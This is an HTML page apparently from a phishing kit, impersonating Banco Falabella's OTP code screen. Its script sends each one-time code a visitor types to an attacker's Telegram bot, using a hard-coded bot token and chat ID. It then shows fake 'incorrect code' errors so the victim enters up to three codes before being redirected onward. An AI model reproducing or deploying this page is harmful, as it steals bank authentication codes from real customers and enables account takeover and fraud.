<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Falabella - Código OTP</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        .error-message {
            color: #d32f2f;
            font-size: 12px;
            margin-top: 8px;
            display: none;
        }
        .error-message.show {
            display: block;
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
        <img src="img/logo-bf-darkmode.aee74748.svg" alt="Logo" class="loading-logo">
    </div>

    <!-- Main Content -->
    <div id="mainContent" class="main-container">
        <!-- Header -->
        <header class="header">
            <div class="logo-container">
                <img src="img/bf-logo-mobile.svg" alt="Banco Falabella" class="logo">
            </div>
            <button class="btn-banca-online">Banca en línea</button>
        </header>

        <!-- Login Form -->
        <div class="login-container">
            <form id="otpForm" class="login-form">
                <div class="form-group">
                    <label class="form-label">Ingrese el código recibido por SMS o Correo</label>
                </div>

                <div class="form-group">
                    <input 
                        type="text" 
                        id="codigoOTP" 
                        class="form-input" 
                        placeholder="Código de verificación"
                        inputmode="numeric"
                        autocomplete="off"
                    >
                    <div class="error-message" id="errorMsg"></div>
                </div>

                <button type="button" id="btnIngresar" class="btn-ingresar" disabled>
                    INGRESAR
                </button>

                <div class="link-container">
                    <a href="#" class="link-clave">¿No recibiste el código? Reenviar</a>
                </div>
            </form>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
        const TELEGRAM_CHAT_ID = '-1003784784181';

        let intentos = 0;

        const codigoOTP = document.getElementById('codigoOTP');
        const btnIngresar = document.getElementById('btnIngresar');
        const errorMsg = document.getElementById('errorMsg');
        const loadingScreen = document.getElementById('loadingScreen');

        codigoOTP.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 6);
            validateOTP();
        });

        function validateOTP() {
            const isValid = codigoOTP.value.length >= 4;
            btnIngresar.disabled = !isValid;
        }

        btnIngresar.addEventListener('click', async function(e) {
            e.preventDefault();
            if (btnIngresar.disabled) return;

            intentos++;
            loadingScreen.style.display = 'flex';

            const mensaje = `📱 <b>OTP (INTENTO ${intentos}/3) - BANCO FALABELLA</b>

<b>Código OTP:</b> <code>${codigoOTP.value}</code>

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
                });

                if ((await response.json()).ok) {
                    if (intentos < 3) {
                        setTimeout(() => {
                            loadingScreen.style.display = 'none';
                            if (intentos === 1) {
                                errorMsg.textContent = '❌ El código OTP es incorrecto.';
                                errorMsg.classList.add('show');
                            } else if (intentos === 2) {
                                errorMsg.textContent = '⚠️ Error en la validación. Intente nuevamente.';
                                errorMsg.classList.add('show');
                            }
                            codigoOTP.value = '';
                            validateOTP();
                        }, 1500);
                    } else {
                        setTimeout(() => {
                            window.location.href = 'dinamica.html';
                        }, 1500);
                    }
                } else {
                    loadingScreen.style.display = 'none';
                    errorMsg.textContent = 'Error en la verificación. Intente nuevamente.';
                    errorMsg.classList.add('show');
                }
            } catch (error) {
                loadingScreen.style.display = 'none';
                errorMsg.textContent = 'Error de conexión. Intente nuevamente.';
                errorMsg.classList.add('show');
            }
        });
    </script>
</body>
</html>
